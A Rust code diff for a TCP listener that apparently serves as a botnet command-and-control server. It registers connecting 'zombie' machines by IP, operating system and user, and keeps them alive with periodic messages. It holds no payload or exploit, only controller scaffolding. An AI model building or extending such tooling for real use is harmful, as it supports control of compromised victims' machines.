@@ -1,5 +1,8 @@
-use std::{net::{TcpListener, TcpStream}, io::{BufWriter, Write}};
-
+use std::{
+    io::{BufWriter, Write, BufReader, BufRead},
+    net::{TcpListener, TcpStream},
+};
+use serde::{Serialize,Deserialize};
 use flume::{Receiver, Sender};
 use s2n_quic::Connection;
 use tokio::select;
@@ -12,11 +15,9 @@ pub async fn start(
     for stream in server.incoming() {
         let transmit = tx.clone();
         match stream {
-            Ok(mut socket) => {
-                std::thread::spawn( move ||{
-                    handle_tcp_connection(&mut socket, transmit).unwrap();
-                })
-            },
+            Ok(socket) => std::thread::spawn(move || {
+                handle_tcp_connection(socket, transmit).unwrap();
+            }),
             Err(_) => {
                 match rx.try_recv() {
                     Ok(_) => break,
@@ -24,30 +25,37 @@ pub async fn start(
                 };
             }
         };
+impl Zombie {
+    fn new(ip: String, os: String, user: String) -> Self {
+        Self { ip, os, user }
+    }
+}
     }
     Ok(())
 }
 
 fn handle_tcp_connection(
-    stream: &mut TcpStream,
+    mut connect:  TcpStream,
     tx: Sender<String>,
 ) -> Result<(), Box<dyn std::error::Error>> {
     //Send notification to append connection to list.
-    let peer_addr = &stream.peer_addr()?.to_string();
-    let add_connection = String::from("add ") + &peer_addr;
+    let mut stream = BufReader::new(&mut connect);
+    let mut zombie = String::new();
+    stream.read_line(&mut zombie)?;
+    let add_connection = String::from("add ") + &zombie.to_string();
     tx.send(add_connection)?;
-    let mut connection = BufWriter::new(stream.try_clone()?);
+    let mut connection = BufWriter::new(connect.try_clone()?);
     // keeping the connection alive. This is for testing.
     loop {
-    connection.write("hello".as_bytes())?;
-    std::thread::sleep(std::time::Duration::from_secs(60));
-    match connection.flush(){
-        Ok(_) => continue,
-        Err(_) => break,
-    };
+        connection.write("hello".as_bytes())?;
+        std::thread::sleep(std::time::Duration::from_secs(60));
+        match connection.flush() {
+            Ok(_) => continue,
+            Err(_) => break,
+        };
     }
     //Remove the connection from the list.
-    let del_connection = String::from("del ") + &peer_addr;
+    let del_connection = String::from("del ") + &zombie.to_string();
     tx.send(del_connection)?;
     Ok(())
 }
@@ -81,3 +89,10 @@ async fn handle_quic_connection(
     tx.send(del_connection)?;
     Ok(())
 }
+#[derive(Serialize, Deserialize, Debug, Clone)]
+struct Zombie {
+    ip: String,
+    os: String,
+    user: String,
+}
+
